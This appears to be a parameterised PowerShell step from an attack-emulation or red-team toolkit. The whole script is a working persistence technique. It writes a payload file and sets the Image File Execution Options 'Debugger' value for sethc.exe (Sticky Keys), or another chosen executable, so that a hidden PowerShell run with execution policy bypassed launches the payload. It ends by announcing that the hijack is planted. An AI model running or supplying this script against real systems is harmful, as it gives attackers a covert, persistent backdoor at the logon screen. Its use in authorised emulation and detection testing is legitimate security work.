script:
if (-not $PAYLOAD_PATH) { throw 'PAYLOAD_PATH is required' }
$exe = if ($EXECUTABLE) { $EXECUTABLE } else { 'sethc.exe' }
$dir = Split-Path $PAYLOAD_PATH -Parent
New-Item -ItemType Directory -Force -Path $dir | Out-Null
if ($PAYLOAD_BODY) { Set-Content -Path $PAYLOAD_PATH -Value $PAYLOAD_BODY -Encoding ascii }
$debugger = if ($DEBUGGER) { $DEBUGGER } else { "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PAYLOAD_PATH`"" }
$k = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$exe"
if (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null }
Set-ItemProperty -Path $k -Name Debugger -Value $debugger -Type String
Write-Output "Debugger hijack planted on $exe"
